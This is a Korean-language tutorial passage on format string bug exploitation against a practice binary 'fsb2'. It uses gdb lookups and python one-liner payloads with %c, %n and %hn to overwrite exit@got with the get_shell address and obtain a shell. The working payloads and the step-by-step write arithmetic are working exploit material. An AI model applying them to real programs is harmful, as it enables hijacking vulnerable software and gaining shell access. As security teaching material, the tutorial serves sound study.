Format String Bug (FSB) : 
    그럼 앞에서 배운 "%Nc"와 "n" 포맷 스트링을 사용하여 exit@got를 원하는 값으로 덮어써 보도록 하겠습니다. 
    우선 exit@got를 get_shell 주소로 덮어쓰기 위해 해당하는 주소를 구합니다.
    ex)
        (gdb) i func get_shell
        All functions matching regular expression "get_shell":
        
        Non-debugging symbols:
        0x08048639  get_shell
        
        (gdb) x/i exit
            0x8048490 <exit@plt>:	jmp    *0x804a024

    fsb2_exploit1은 1024 바이트만큼 출력해 exit@got를 1024인 0x400 값으로 덮어쓰는 공격 코드입니다.
    ex) fsb2_exploit1
        (gdb) r <<< $(python -c 'print "\x24\xa0\x04\x08%1024c%1$n"')
        Starting program: ./fsb2 <<< $(python -c 'print "\x24\xa0\x04\x08%1024c%1$n"')
        Input: $ 









                                                          $ // 대강 또 1024개 char

        Program received signal SIGSEGV, Segmentation fault.
        0x00000404 in ?? ()

    "exit@got주소%1024c%1$n" 포맷 스트링을 사용하여 덮어쓴 결과 1024 ( 0x400 )이 아닌 0x404 값이 덮어써진 것을 확인할 수 있습니다. 
    이러한 이유는 다음과 같습니다.

    "n"은 출력한 문자열의 길이 값을 전달된 인자에 쓰는 포맷 스트링입니다. 
    공격 코드의 경우 "%1024c"를 통해 1024 바이트만큼을 출력했지만 앞 부분에 입력한 exit@got 주소,
    즉 4 바이트가 포함되어 있기 때문에 1028인 0x404 값이 덮어써진 것입니다.

    fsb2_exploit2는 exit@got 주소를 get_shell 주소로 덮어쓰는 공격 코드입니다.
    ex)
        $ (python -c 'print "\x24\xa0\x04\x08%134514229c%1$n"') | ./fsb2

    이는 get_shell 주소인 134514233 바이트를 화면에 출력한 이후 값을 덮어쓰기 때문에 공격이 오래 걸리거나 TIMEOUT이 발생할 수 있습니다.

    exit@got 주소를 2 바이트, 혹은 1 바이트씩 나눠 덮어쓰는 방법을 사용하면 이와 같은 문제를 해결할 수 있습니다.

    지금까지 하나의 포인터만을 참조하여 값을 읽거나 쓰는 것을 배웠습니다.
    입력받을 수 있는 길이가 충분한다면 여러 개의 주소를 입력하여 여러 포인터를 참조하여 읽고 쓰는 것 또한 가능합니다.

    fsb2_exploit3는 exit@got+2 주소와 exit@got 주소를 입력하고 "x" 포맷 스트링을 통해 출력한 결과입니다. 
    ex)
        $ (python -c 'print "\x26\xa0\x04\x08\x24\xa0\x04\x08%x.%x.%x"') | ./fsb2
        Input: &$804a026.804a024.252e7825

    출력된 결과를 확인해보면 두 개의 주소가 쓰여진 것을 확인할 수 있고 공격할 때 또한 포맷 스트링 인자 중 각각 첫 번째 인덱스,
    두 번째 인덱스를 참조한다면 두 개의 주소 모두 덮어쓸 수 있다는 것을 짐작할 수 있습니다.

    2 바이트를 나눠 덮어써 공격을 하기 때문에 쓰는 값 또한 4 바이트가 아닌 2 바이트가 돼야 합니다. 이를 위해 "n"이 아닌 "hn" 포맷 스트링을 사용합니다.

    fsb2_exploit4는 exit@got+2와 exit@got 주소를 참조하여 get_shell 함수로 덮어쓰는 공격 코드입니다.
    ex)
        $ (python -c 'print "\x26\xa0\x04\x08\x24\xa0\x04\x08%2044c%1$hn%32309c%2$hn"';cat;) | ./fsb2
        
        uid=1001(theori) gid=1001(theori) groups=1001(theori)

    먼저 exit@got+2 주소에 "%2044c" 만큼 출력하여 "hn" 포맷 스트링을 통해 2052( 0x0804 )를 덮어씁니다.
    이후, exit@got 주소를 참조하여 get_shell 함수의 하위 2 바이트인 0x8639( 34361 )를 덮어쓰되, 화면에 이미 출력된 문자열의 길이를 고려하여 덮어써야 합니다.
    앞서 0x0804만큼 출력했기 때문에 0x8639 - 0x804 연산을 통해 나온 결과 값인 32309를 화면에 출력하면 이후에 "n" 포맷으로 인해 덮어쓸 값은 0x8639가 됩니다.
    "%hn" 포맷을 이용해 exit@got 주소에 0x8639 값을 쓴다면 성공적으로 exit@got를 get_shell 함수의 주소로 조작할 수 있습니다.

    
























